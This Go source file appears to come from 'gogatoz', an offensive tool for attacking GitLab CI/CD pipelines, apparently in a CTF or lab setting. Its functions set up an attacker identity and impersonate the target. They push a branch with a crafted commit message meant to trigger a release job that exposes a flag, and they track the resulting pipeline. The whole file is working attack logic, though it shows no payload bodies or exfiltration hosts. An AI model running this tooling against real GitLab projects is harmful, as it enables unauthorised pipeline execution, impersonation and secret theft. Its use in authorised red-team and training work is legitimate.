package cmd

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"time"

	"github.com/mr-pmillz/gogatoz/pkg/attack"
	payloadgen "github.com/mr-pmillz/gogatoz/pkg/attack/payloads"
	"github.com/mr-pmillz/gogatoz/pkg/gitlabx"
	"github.com/spf13/cobra"
)

// runAttackGeneratedPayload adapts a first-class attack mode to the common
// commit-and-track pipeline flow without requiring users to repeat
// --commit-ci --payload <name>.
func runAttackGeneratedPayload(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client, payload string) error {
	savedPayload := atkPayload
	savedCommitCI := atkCommitCI
	atkPayload = payload
	atkCommitCI = true
	defer func() {
		atkPayload = savedPayload
		atkCommitCI = savedCommitCI
	}()
	return runAttackCommitCI(ctx, cmd, client)
}

// runAttackCommitPrefix preserves the target's existing CI configuration. The
// vulnerability is triggered by the commit message, so replacing
// .gitlab-ci.yml would remove the release job that exposes the challenge flag.
func runAttackCommitPrefix(ctx context.Context, cmd *cobra.Command, client *gitlabx.Client) error {
	finalBranch, err := ensureBranchDeconflict(ctx, client, atkTarget, atkBranch, atkDeconflict, atkAuthorName, atkAuthorEmail)
	if err != nil {
		return err
	}

	att := attack.NewAttacker(client, strings.TrimSpace(gitlabURL), atkAuthorName, atkAuthorEmail, 0)
	if _, err := att.SetupUser(ctx); err != nil {
		return fmt.Errorf("setup user: %w", err)
	}
	if err := applyAttackImpersonation(ctx, att, atkTarget); err != nil {
		return err
	}
	if err := att.EnsureBranch(ctx, atkTarget, finalBranch); err != nil {
		return fmt.Errorf("ensure attack branch: %w", err)
	}

	message := payloadgen.GenerateCommitPrefixMessage(payloadgen.CommitPrefixOptions{
		Prefix:  strings.TrimSpace(atkPrefixValue),
		Message: strings.TrimSpace(atkPrefixMessage),
	})
	const markerPath = ".gogatoz-release-trigger"
	const markerContent = "release workflow validation\n"
	if err := att.UpsertFile(ctx, atkTarget, finalBranch, markerPath, markerContent, message); err != nil {
		return fmt.Errorf("commit prefixed trigger: %w", err)
	}

	stalePipelineID, _ := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, 0, 500*time.Millisecond, 5*time.Second)
	pipelineID, waitErr := attack.WaitForPipelineForRef(ctx, client, atkTarget, finalBranch, stalePipelineID, 2*time.Second, 30*time.Second)
	if waitErr != nil && stalePipelineID > 0 {
		pipelineID = stalePipelineID
	}
	pipelineURL := ""
	if pipelineID > 0 {
		pipelineURL = fmt.Sprintf("%s/%s/-/pipelines/%d", strings.TrimSuffix(gitlabURL, "/"), atkTarget, pipelineID)
	}

	fmt.Fprintf(cmd.ErrOrStderr(), "[attack] prefixed commit created on branch %s\n", finalBranch)
	if outputJSON {
		out := struct {
			Branch      string `json:"branch"`
			Commit      string `json:"commit_message"`
			PipelineURL string `json:"pipeline_url,omitempty"`
			PipelineID  int64  `json:"pipeline_id,omitempty"`
		}{
			Branch:      finalBranch,
			Commit:      message,
			PipelineURL: pipelineURL,
			PipelineID:  pipelineID,
		}
		b, _ := json.MarshalIndent(out, "", "  ")
		_, err := fmt.Fprintln(cmd.OutOrStdout(), string(b))
		return err
	}

	renderSuccess(cmd.OutOrStdout(), fmt.Sprintf("Release-triggering commit pushed to branch %s", finalBranch))
	if pipelineURL != "" {
		renderInfo(cmd.OutOrStdout(), fmt.Sprintf("Pipeline URL: %s", pipelineURL))
	}
	return nil
}
